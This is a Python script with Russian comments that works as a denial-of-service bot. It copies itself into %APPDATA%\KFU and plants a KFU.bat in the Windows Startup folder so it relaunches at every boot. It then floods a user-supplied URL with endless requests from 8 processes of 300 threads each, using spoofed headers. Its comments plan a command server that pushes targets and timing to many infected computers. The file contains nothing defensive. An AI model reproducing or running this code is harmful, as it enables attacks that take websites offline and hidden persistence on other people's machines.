import multiprocessing
import threading
import requests
import time
from fake_headers import Headers
import os
import shutil


def copy_folder_to_destination():
    # Определите путь, куда будет скопирована папка
    destination_folder = os.path.join(os.getenv('APPDATA'), 'KFU')

    # Определяем текущую папку скрипта
    current_folder = os.path.dirname(os.path.abspath(__file__))

    # Копируем всю папку, если она еще не существует в папке назначения
    if not os.path.exists(destination_folder):
        shutil.copytree(current_folder, destination_folder)
        print(f"Папка {current_folder} была скопирована в {destination_folder}")
    else:
        print(f"Папка {destination_folder} уже существует.")

def request(target):
    while True:
        try:
            a = Headers()
            headers = a.generate()
            res = requests.get(target, headers=headers)
            print("Запрос отправлен!")
        except requests.exceptions.ConnectionError:
            print("Ошибка соединения!")

def start_threads(target_url, thread_count):
    for i in range(thread_count):
        thread = threading.Thread(target=request, args=(target_url,))
        thread.start()
        print(f"{i + 1} поток запущен!")

def start_processes(target_url, process_count, thread_count):
    for i in range(process_count):
        process = multiprocessing.Process(target=start_threads, args=(target_url, thread_count))
        process.start()
        print(f"{i + 1} процесс запущен!")

def create_bat_in_startup():
    # Определяем путь к папке автозагрузки
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    bat_filename = 'KFU.bat'
    bat_dest_path = os.path.join(startup_path, bat_filename)
    destination_folder = os.path.join(os.getenv('APPDATA'), 'KFU')
    script_path = os.path.join(destination_folder, os.path.basename(__file__))
    bat_content = """@echo off
    cd /d "{}"
    python "{}"
    """.format(destination_folder, script_path)

    # Проверяем, есть ли уже bat файл в папке автозагрузки
    if not os.path.exists(bat_dest_path):
        with open(bat_dest_path, 'w') as bat_file:
            bat_file.write(bat_content)
        print(f"BAT файл {bat_filename} был создан в папке автозагрузки.")
    else:
        print(f"BAT файл {bat_filename} уже существует в папке автозагрузки.")

# Нужно создать функцию для получения данных(Цель, Время для одновременного запуска, Длительность)
# Функция будет обращаться к серверу, чтобы получить данные, каждые 5 минут кратно минутам time
# Cервер будет в виде сайта
# Нужно еще создать функцию для определения количества компьютеров


if __name__ == "__main__":
    # Копируем папку в другое место
    copy_folder_to_destination()

    # Создаем BAT файл в папке автозагрузки
    create_bat_in_startup()

    url = input("Введите URL: ")
    process_count = 8  # Количество процессов
    thread_count = 300  # Количество потоков на процесс
    start_processes(url, process_count, thread_count)
